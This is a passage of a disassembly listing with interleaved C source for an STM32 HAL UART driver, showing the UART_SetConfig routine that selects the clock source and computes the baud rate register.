 8005562:	681b      	ldr	r3, [r3, #0]
 8005564:	689a      	ldr	r2, [r3, #8]
 8005566:	687b      	ldr	r3, [r7, #4]
 8005568:	681b      	ldr	r3, [r3, #0]
 800556a:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 800556e:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 8005570:	687b      	ldr	r3, [r7, #4]
 8005572:	681b      	ldr	r3, [r3, #0]
 8005574:	681a      	ldr	r2, [r3, #0]
 8005576:	687b      	ldr	r3, [r7, #4]
 8005578:	681b      	ldr	r3, [r3, #0]
 800557a:	f042 0201 	orr.w	r2, r2, #1
 800557e:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 8005580:	6878      	ldr	r0, [r7, #4]
 8005582:	f000 fad3 	bl	8005b2c <UART_CheckIdleState>
 8005586:	4603      	mov	r3, r0
}
 8005588:	4618      	mov	r0, r3
 800558a:	3708      	adds	r7, #8
 800558c:	46bd      	mov	sp, r7
 800558e:	bd80      	pop	{r7, pc}

08005590 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005590:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005594:	b08a      	sub	sp, #40	; 0x28
 8005596:	af00      	add	r7, sp, #0
 8005598:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 800559a:	2300      	movs	r3, #0
 800559c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 80055a0:	68fb      	ldr	r3, [r7, #12]
 80055a2:	689a      	ldr	r2, [r3, #8]
 80055a4:	68fb      	ldr	r3, [r7, #12]
 80055a6:	691b      	ldr	r3, [r3, #16]
 80055a8:	431a      	orrs	r2, r3
 80055aa:	68fb      	ldr	r3, [r7, #12]
 80055ac:	695b      	ldr	r3, [r3, #20]
 80055ae:	431a      	orrs	r2, r3
 80055b0:	68fb      	ldr	r3, [r7, #12]
 80055b2:	69db      	ldr	r3, [r3, #28]
 80055b4:	4313      	orrs	r3, r2
 80055b6:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 80055b8:	68fb      	ldr	r3, [r7, #12]
 80055ba:	681b      	ldr	r3, [r3, #0]
 80055bc:	681a      	ldr	r2, [r3, #0]
 80055be:	4bb4      	ldr	r3, [pc, #720]	; (8005890 <UART_SetConfig+0x300>)
 80055c0:	4013      	ands	r3, r2
 80055c2:	68fa      	ldr	r2, [r7, #12]
 80055c4:	6812      	ldr	r2, [r2, #0]
 80055c6:	6a79      	ldr	r1, [r7, #36]	; 0x24
 80055c8:	430b      	orrs	r3, r1
 80055ca:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 80055cc:	68fb      	ldr	r3, [r7, #12]
 80055ce:	681b      	ldr	r3, [r3, #0]
 80055d0:	685b      	ldr	r3, [r3, #4]
 80055d2:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 80055d6:	68fb      	ldr	r3, [r7, #12]
 80055d8:	68da      	ldr	r2, [r3, #12]
 80055da:	68fb      	ldr	r3, [r7, #12]
 80055dc:	681b      	ldr	r3, [r3, #0]
 80055de:	430a      	orrs	r2, r1
 80055e0:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 80055e2:	68fb      	ldr	r3, [r7, #12]
 80055e4:	699b      	ldr	r3, [r3, #24]
 80055e6:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 80055e8:	68fb      	ldr	r3, [r7, #12]
 80055ea:	681b      	ldr	r3, [r3, #0]
 80055ec:	4aa9      	ldr	r2, [pc, #676]	; (8005894 <UART_SetConfig+0x304>)
 80055ee:	4293      	cmp	r3, r2
 80055f0:	d004      	beq.n	80055fc <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 80055f2:	68fb      	ldr	r3, [r7, #12]
 80055f4:	6a1b      	ldr	r3, [r3, #32]
 80055f6:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80055f8:	4313      	orrs	r3, r2
 80055fa:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 80055fc:	68fb      	ldr	r3, [r7, #12]
 80055fe:	681b      	ldr	r3, [r3, #0]
 8005600:	689b      	ldr	r3, [r3, #8]
 8005602:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 8005606:	68fb      	ldr	r3, [r7, #12]
 8005608:	681b      	ldr	r3, [r3, #0]
 800560a:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 800560c:	430a      	orrs	r2, r1
 800560e:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005610:	68fb      	ldr	r3, [r7, #12]
 8005612:	681b      	ldr	r3, [r3, #0]
 8005614:	4aa0      	ldr	r2, [pc, #640]	; (8005898 <UART_SetConfig+0x308>)
 8005616:	4293      	cmp	r3, r2
 8005618:	d126      	bne.n	8005668 <UART_SetConfig+0xd8>
 800561a:	4ba0      	ldr	r3, [pc, #640]	; (800589c <UART_SetConfig+0x30c>)
 800561c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005620:	f003 0303 	and.w	r3, r3, #3
 8005624:	2b03      	cmp	r3, #3
 8005626:	d81b      	bhi.n	8005660 <UART_SetConfig+0xd0>
 8005628:	a201      	add	r2, pc, #4	; (adr r2, 8005630 <UART_SetConfig+0xa0>)
 800562a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800562e:	bf00      	nop
 8005630:	08005641 	.word	0x08005641
 8005634:	08005651 	.word	0x08005651
 8005638:	08005649 	.word	0x08005649
 800563c:	08005659 	.word	0x08005659
 8005640:	2301      	movs	r3, #1
 8005642:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005646:	e080      	b.n	800574a <UART_SetConfig+0x1ba>
 8005648:	2302      	movs	r3, #2
 800564a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800564e:	e07c      	b.n	800574a <UART_SetConfig+0x1ba>
 8005650:	2304      	movs	r3, #4
 8005652:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005656:	e078      	b.n	800574a <UART_SetConfig+0x1ba>
 8005658:	2308      	movs	r3, #8
 800565a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800565e:	e074      	b.n	800574a <UART_SetConfig+0x1ba>
 8005660:	2310      	movs	r3, #16
 8005662:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005666:	e070      	b.n	800574a <UART_SetConfig+0x1ba>
 8005668:	68fb      	ldr	r3, [r7, #12]
 800566a:	681b      	ldr	r3, [r3, #0]
 800566c:	4a8c      	ldr	r2, [pc, #560]	; (80058a0 <UART_SetConfig+0x310>)
 800566e:	4293      	cmp	r3, r2
 8005670:	d138      	bne.n	80056e4 <UART_SetConfig+0x154>
 8005672:	4b8a      	ldr	r3, [pc, #552]	; (800589c <UART_SetConfig+0x30c>)
 8005674:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005678:	f003 030c 	and.w	r3, r3, #12
 800567c:	2b0c      	cmp	r3, #12
 800567e:	d82d      	bhi.n	80056dc <UART_SetConfig+0x14c>
 8005680:	a201      	add	r2, pc, #4	; (adr r2, 8005688 <UART_SetConfig+0xf8>)
 8005682:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005686:	bf00      	nop
 8005688:	080056bd 	.word	0x080056bd
 800568c:	080056dd 	.word	0x080056dd
 8005690:	080056dd 	.word	0x080056dd
 8005694:	080056dd 	.word	0x080056dd
 8005698:	080056cd 	.word	0x080056cd
 800569c:	080056dd 	.word	0x080056dd
 80056a0:	080056dd 	.word	0x080056dd
 80056a4:	080056dd 	.word	0x080056dd
 80056a8:	080056c5 	.word	0x080056c5
 80056ac:	080056dd 	.word	0x080056dd
 80056b0:	080056dd 	.word	0x080056dd
 80056b4:	080056dd 	.word	0x080056dd
 80056b8:	080056d5 	.word	0x080056d5
 80056bc:	2300      	movs	r3, #0
 80056be:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056c2:	e042      	b.n	800574a <UART_SetConfig+0x1ba>
 80056c4:	2302      	movs	r3, #2
 80056c6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056ca:	e03e      	b.n	800574a <UART_SetConfig+0x1ba>
 80056cc:	2304      	movs	r3, #4
 80056ce:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056d2:	e03a      	b.n	800574a <UART_SetConfig+0x1ba>
 80056d4:	2308      	movs	r3, #8
 80056d6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056da:	e036      	b.n	800574a <UART_SetConfig+0x1ba>
 80056dc:	2310      	movs	r3, #16
 80056de:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056e2:	e032      	b.n	800574a <UART_SetConfig+0x1ba>
 80056e4:	68fb      	ldr	r3, [r7, #12]
 80056e6:	681b      	ldr	r3, [r3, #0]
 80056e8:	4a6a      	ldr	r2, [pc, #424]	; (8005894 <UART_SetConfig+0x304>)
 80056ea:	4293      	cmp	r3, r2
 80056ec:	d12a      	bne.n	8005744 <UART_SetConfig+0x1b4>
 80056ee:	4b6b      	ldr	r3, [pc, #428]	; (800589c <UART_SetConfig+0x30c>)
 80056f0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80056f4:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 80056f8:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80056fc:	d01a      	beq.n	8005734 <UART_SetConfig+0x1a4>
 80056fe:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005702:	d81b      	bhi.n	800573c <UART_SetConfig+0x1ac>
 8005704:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005708:	d00c      	beq.n	8005724 <UART_SetConfig+0x194>
 800570a:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 800570e:	d815      	bhi.n	800573c <UART_SetConfig+0x1ac>
 8005710:	2b00      	cmp	r3, #0
 8005712:	d003      	beq.n	800571c <UART_SetConfig+0x18c>
 8005714:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8005718:	d008      	beq.n	800572c <UART_SetConfig+0x19c>
 800571a:	e00f      	b.n	800573c <UART_SetConfig+0x1ac>
 800571c:	2300      	movs	r3, #0
 800571e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005722:	e012      	b.n	800574a <UART_SetConfig+0x1ba>
 8005724:	2302      	movs	r3, #2
 8005726:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800572a:	e00e      	b.n	800574a <UART_SetConfig+0x1ba>
 800572c:	2304      	movs	r3, #4
 800572e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005732:	e00a      	b.n	800574a <UART_SetConfig+0x1ba>
 8005734:	2308      	movs	r3, #8
 8005736:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800573a:	e006      	b.n	800574a <UART_SetConfig+0x1ba>
 800573c:	2310      	movs	r3, #16
 800573e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005742:	e002      	b.n	800574a <UART_SetConfig+0x1ba>
 8005744:	2310      	movs	r3, #16
 8005746:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 800574a:	68fb      	ldr	r3, [r7, #12]
 800574c:	681b      	ldr	r3, [r3, #0]
 800574e:	4a51      	ldr	r2, [pc, #324]	; (8005894 <UART_SetConfig+0x304>)
 8005750:	4293      	cmp	r3, r2
 8005752:	d17a      	bne.n	800584a <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 8005754:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005758:	2b08      	cmp	r3, #8
 800575a:	d824      	bhi.n	80057a6 <UART_SetConfig+0x216>
 800575c:	a201      	add	r2, pc, #4	; (adr r2, 8005764 <UART_SetConfig+0x1d4>)
 800575e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005762:	bf00      	nop
 8005764:	08005789 	.word	0x08005789
 8005768:	080057a7 	.word	0x080057a7
 800576c:	08005791 	.word	0x08005791
 8005770:	080057a7 	.word	0x080057a7
 8005774:	08005797 	.word	0x08005797
 8005778:	080057a7 	.word	0x080057a7
 800577c:	080057a7 	.word	0x080057a7
 8005780:	080057a7 	.word	0x080057a7
 8005784:	0800579f 	.word	0x0800579f
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005788:	f7fe fe6c 	bl	8004464 <HAL_RCC_GetPCLK1Freq>
 800578c:	61f8      	str	r0, [r7, #28]
        break;
 800578e:	e010      	b.n	80057b2 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005790:	4b44      	ldr	r3, [pc, #272]	; (80058a4 <UART_SetConfig+0x314>)
 8005792:	61fb      	str	r3, [r7, #28]
        break;
 8005794:	e00d      	b.n	80057b2 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005796:	f7fe fdcd 	bl	8004334 <HAL_RCC_GetSysClockFreq>
 800579a:	61f8      	str	r0, [r7, #28]
        break;
 800579c:	e009      	b.n	80057b2 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800579e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80057a2:	61fb      	str	r3, [r7, #28]
        break;
 80057a4:	e005      	b.n	80057b2 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 80057a6:	2300      	movs	r3, #0
 80057a8:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80057aa:	2301      	movs	r3, #1
 80057ac:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80057b0:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 80057b2:	69fb      	ldr	r3, [r7, #28]
 80057b4:	2b00      	cmp	r3, #0
 80057b6:	f000 8107 	beq.w	80059c8 <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80057ba:	68fb      	ldr	r3, [r7, #12]
 80057bc:	685a      	ldr	r2, [r3, #4]
 80057be:	4613      	mov	r3, r2
 80057c0:	005b      	lsls	r3, r3, #1
 80057c2:	4413      	add	r3, r2
 80057c4:	69fa      	ldr	r2, [r7, #28]
 80057c6:	429a      	cmp	r2, r3
 80057c8:	d305      	bcc.n	80057d6 <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 80057ca:	68fb      	ldr	r3, [r7, #12]
 80057cc:	685b      	ldr	r3, [r3, #4]
 80057ce:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80057d0:	69fa      	ldr	r2, [r7, #28]
 80057d2:	429a      	cmp	r2, r3
 80057d4:	d903      	bls.n	80057de <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 80057d6:	2301      	movs	r3, #1
 80057d8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80057dc:	e0f4      	b.n	80059c8 <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 80057de:	69fb      	ldr	r3, [r7, #28]
 80057e0:	2200      	movs	r2, #0
 80057e2:	461c      	mov	r4, r3
 80057e4:	4615      	mov	r5, r2
 80057e6:	f04f 0200 	mov.w	r2, #0
 80057ea:	f04f 0300 	mov.w	r3, #0
 80057ee:	022b      	lsls	r3, r5, #8
 80057f0:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 80057f4:	0222      	lsls	r2, r4, #8
 80057f6:	68f9      	ldr	r1, [r7, #12]
 80057f8:	6849      	ldr	r1, [r1, #4]
 80057fa:	0849      	lsrs	r1, r1, #1
 80057fc:	2000      	movs	r0, #0
 80057fe:	4688      	mov	r8, r1
 8005800:	4681      	mov	r9, r0
 8005802:	eb12 0a08 	adds.w	sl, r2, r8
 8005806:	eb43 0b09 	adc.w	fp, r3, r9
 800580a:	68fb      	ldr	r3, [r7, #12]
 800580c:	685b      	ldr	r3, [r3, #4]
 800580e:	2200      	movs	r2, #0
 8005810:	603b      	str	r3, [r7, #0]
 8005812:	607a      	str	r2, [r7, #4]
 8005814:	e9d7 2300 	ldrd	r2, r3, [r7]
 8005818:	4650      	mov	r0, sl
 800581a:	4659      	mov	r1, fp
 800581c:	f7fa fcde 	bl	80001dc <__aeabi_uldivmod>
 8005820:	4602      	mov	r2, r0
 8005822:	460b      	mov	r3, r1
 8005824:	4613      	mov	r3, r2
 8005826:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 8005828:	69bb      	ldr	r3, [r7, #24]
 800582a:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 800582e:	d308      	bcc.n	8005842 <UART_SetConfig+0x2b2>
 8005830:	69bb      	ldr	r3, [r7, #24]
 8005832:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005836:	d204      	bcs.n	8005842 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 8005838:	68fb      	ldr	r3, [r7, #12]
 800583a:	681b      	ldr	r3, [r3, #0]
 800583c:	69ba      	ldr	r2, [r7, #24]
 800583e:	60da      	str	r2, [r3, #12]
 8005840:	e0c2      	b.n	80059c8 <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 8005842:	2301      	movs	r3, #1
 8005844:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005848:	e0be      	b.n	80059c8 <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 800584a:	68fb      	ldr	r3, [r7, #12]
 800584c:	69db      	ldr	r3, [r3, #28]
 800584e:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 8005852:	d16a      	bne.n	800592a <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 8005854:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005858:	2b08      	cmp	r3, #8
 800585a:	d834      	bhi.n	80058c6 <UART_SetConfig+0x336>
 800585c:	a201      	add	r2, pc, #4	; (adr r2, 8005864 <UART_SetConfig+0x2d4>)
 800585e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005862:	bf00      	nop
 8005864:	08005889 	.word	0x08005889
 8005868:	080058a9 	.word	0x080058a9
 800586c:	080058b1 	.word	0x080058b1
 8005870:	080058c7 	.word	0x080058c7
 8005874:	080058b7 	.word	0x080058b7
 8005878:	080058c7 	.word	0x080058c7
 800587c:	080058c7 	.word	0x080058c7
 8005880:	080058c7 	.word	0x080058c7
 8005884:	080058bf 	.word	0x080058bf
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005888:	f7fe fdec 	bl	8004464 <HAL_RCC_GetPCLK1Freq>
 800588c:	61f8      	str	r0, [r7, #28]
        break;
 800588e:	e020      	b.n	80058d2 <UART_SetConfig+0x342>
 8005890:	efff69f3 	.word	0xefff69f3
 8005894:	40008000 	.word	0x40008000
 8005898:	40013800 	.word	0x40013800
 800589c:	40021000 	.word	0x40021000
 80058a0:	40004400 	.word	0x40004400
 80058a4:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 80058a8:	f7fe fdf2 	bl	8004490 <HAL_RCC_GetPCLK2Freq>
 80058ac:	61f8      	str	r0, [r7, #28]
        break;
 80058ae:	e010      	b.n	80058d2 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80058b0:	4b4c      	ldr	r3, [pc, #304]	; (80059e4 <UART_SetConfig+0x454>)
 80058b2:	61fb      	str	r3, [r7, #28]
        break;
 80058b4:	e00d      	b.n	80058d2 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80058b6:	f7fe fd3d 	bl	8004334 <HAL_RCC_GetSysClockFreq>
 80058ba:	61f8      	str	r0, [r7, #28]
        break;
 80058bc:	e009      	b.n	80058d2 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80058be:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80058c2:	61fb      	str	r3, [r7, #28]
        break;
 80058c4:	e005      	b.n	80058d2 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 80058c6:	2300      	movs	r3, #0
 80058c8:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80058ca:	2301      	movs	r3, #1
 80058cc:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80058d0:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 80058d2:	69fb      	ldr	r3, [r7, #28]
 80058d4:	2b00      	cmp	r3, #0
 80058d6:	d077      	beq.n	80059c8 <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 80058d8:	69fb      	ldr	r3, [r7, #28]
 80058da:	005a      	lsls	r2, r3, #1
 80058dc:	68fb      	ldr	r3, [r7, #12]
 80058de:	685b      	ldr	r3, [r3, #4]
 80058e0:	085b      	lsrs	r3, r3, #1
 80058e2:	441a      	add	r2, r3
 80058e4:	68fb      	ldr	r3, [r7, #12]
 80058e6:	685b      	ldr	r3, [r3, #4]
 80058e8:	fbb2 f3f3 	udiv	r3, r2, r3
 80058ec:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 80058ee:	69bb      	ldr	r3, [r7, #24]
 80058f0:	2b0f      	cmp	r3, #15
 80058f2:	d916      	bls.n	8005922 <UART_SetConfig+0x392>
 80058f4:	69bb      	ldr	r3, [r7, #24]
 80058f6:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80058fa:	d212      	bcs.n	8005922 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 80058fc:	69bb      	ldr	r3, [r7, #24]
 80058fe:	b29b      	uxth	r3, r3
 8005900:	f023 030f 	bic.w	r3, r3, #15
 8005904:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 8005906:	69bb      	ldr	r3, [r7, #24]
 8005908:	085b      	lsrs	r3, r3, #1
 800590a:	b29b      	uxth	r3, r3
 800590c:	f003 0307 	and.w	r3, r3, #7
 8005910:	b29a      	uxth	r2, r3
 8005912:	8afb      	ldrh	r3, [r7, #22]
 8005914:	4313      	orrs	r3, r2
 8005916:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 8005918:	68fb      	ldr	r3, [r7, #12]
 800591a:	681b      	ldr	r3, [r3, #0]
 800591c:	8afa      	ldrh	r2, [r7, #22]
 800591e:	60da      	str	r2, [r3, #12]
 8005920:	e052      	b.n	80059c8 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005922:	2301      	movs	r3, #1
 8005924:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005928:	e04e      	b.n	80059c8 <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 800592a:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 800592e:	2b08      	cmp	r3, #8
 8005930:	d827      	bhi.n	8005982 <UART_SetConfig+0x3f2>
 8005932:	a201      	add	r2, pc, #4	; (adr r2, 8005938 <UART_SetConfig+0x3a8>)
 8005934:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005938:	0800595d 	.word	0x0800595d
 800593c:	08005965 	.word	0x08005965
 8005940:	0800596d 	.word	0x0800596d
 8005944:	08005983 	.word	0x08005983
 8005948:	08005973 	.word	0x08005973
 800594c:	08005983 	.word	0x08005983
 8005950:	08005983 	.word	0x08005983
 8005954:	08005983 	.word	0x08005983
 8005958:	0800597b 	.word	0x0800597b
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800595c:	f7fe fd82 	bl	8004464 <HAL_RCC_GetPCLK1Freq>
 8005960:	61f8      	str	r0, [r7, #28]
        break;
 8005962:	e014      	b.n	800598e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005964:	f7fe fd94 	bl	8004490 <HAL_RCC_GetPCLK2Freq>
 8005968:	61f8      	str	r0, [r7, #28]
        break;
 800596a:	e010      	b.n	800598e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 800596c:	4b1d      	ldr	r3, [pc, #116]	; (80059e4 <UART_SetConfig+0x454>)
 800596e:	61fb      	str	r3, [r7, #28]
        break;
 8005970:	e00d      	b.n	800598e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005972:	f7fe fcdf 	bl	8004334 <HAL_RCC_GetSysClockFreq>
 8005976:	61f8      	str	r0, [r7, #28]
        break;
 8005978:	e009      	b.n	800598e <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800597a:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800597e:	61fb      	str	r3, [r7, #28]
        break;
 8005980:	e005      	b.n	800598e <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005982:	2300      	movs	r3, #0
 8005984:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005986:	2301      	movs	r3, #1
 8005988:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 800598c:	bf00      	nop
    }

    if (pclk != 0U)
 800598e:	69fb      	ldr	r3, [r7, #28]
 8005990:	2b00      	cmp	r3, #0
 8005992:	d019      	beq.n	80059c8 <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005994:	68fb      	ldr	r3, [r7, #12]
 8005996:	685b      	ldr	r3, [r3, #4]
 8005998:	085a      	lsrs	r2, r3, #1
 800599a:	69fb      	ldr	r3, [r7, #28]
 800599c:	441a      	add	r2, r3
 800599e:	68fb      	ldr	r3, [r7, #12]
 80059a0:	685b      	ldr	r3, [r3, #4]
 80059a2:	fbb2 f3f3 	udiv	r3, r2, r3
 80059a6:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 80059a8:	69bb      	ldr	r3, [r7, #24]
 80059aa:	2b0f      	cmp	r3, #15
 80059ac:	d909      	bls.n	80059c2 <UART_SetConfig+0x432>
